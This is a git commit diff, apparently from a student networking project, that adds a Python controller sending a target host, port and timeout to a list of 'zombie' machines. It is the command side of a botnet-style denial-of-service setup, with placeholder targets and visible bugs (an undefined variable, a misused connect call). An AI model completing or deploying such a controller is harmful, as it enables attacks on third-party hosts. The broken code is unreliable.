95b0d04a90d54d10d4c0e620321a05e16ba34e6a
cgt2 <codythomas2013@gmail.com>
2013-11-23 16:38:10 -0800

    added tcp control

--- project3/control.py
+++ project3/control.py
@@ -1,8 +1,24 @@
-import httplib
+import socket
+import time
 
 
+ZOMBIES = ["list here"]
+PORT = 15000
+TIMEOUT = 10000
+TARGET = ""
+TARGET_PORT = 80
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-conn = httplib.HTTPConnection("attu.cs.washington.edu")
-conn.request("HEAD","/index.html")
-res = conn.getresponse()
-print res.status, res.reason
+for zombie in ZOMBIES:
+    while True:
+        try:
+            data = "{0} {1} {2}".format(TIMEOUT, TARGET, TARGET_PORT)
+            sock.connect(ZOMBIE, PORT)
+            sock.sendall(data + "\n")
+            rec = sock.recv(1024)
+            if rec != "ACK\n":
+                break
+        except:
+            print "Trying again"
+            time.sleep(3)
+sock.close()
